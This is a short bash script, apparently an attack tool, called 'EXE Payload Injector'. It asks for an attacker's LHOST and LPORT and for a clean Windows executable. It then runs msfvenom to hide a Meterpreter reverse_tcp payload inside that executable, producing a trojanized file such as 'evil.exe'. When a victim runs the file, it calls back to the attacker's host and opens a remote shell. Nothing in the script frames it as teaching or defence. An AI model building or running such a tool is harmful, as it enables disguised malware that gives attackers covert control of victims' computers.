#!/bin/bash

echo "==============================="
echo "      EXE Payload Injector     "
echo "==============================="

# Ask for LHOST and LPORT
read -p "🌐 Enter LHOST: " lhost
read -p "🎯 Enter LPORT: " lport

# Loop to ensure the EXE file exists
while true; do
    read -p "Enter the path to a clean EXE file (e.g., notepad.exe): " input_exe
    if [ -f "$input_exe" ]; then
        break
    else
        echo "[!] File not found. Please enter a valid path to an EXE file."
    fi
done

# Ask for output filename
read -p "Enter the output file name (e.g., evil.exe): " output_exe

# Generate and inject the payload
echo "[*] Injecting payload into $input_exe..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -x "$input_exe" -f exe -o "$output_exe"

# Check if injection was successful
if [ $? -eq 0 ]; then
    echo "[+] Payload injected successfully! Saved as: $output_exe"
else
    echo "[!] Injection failed. Please check your inputs."
fi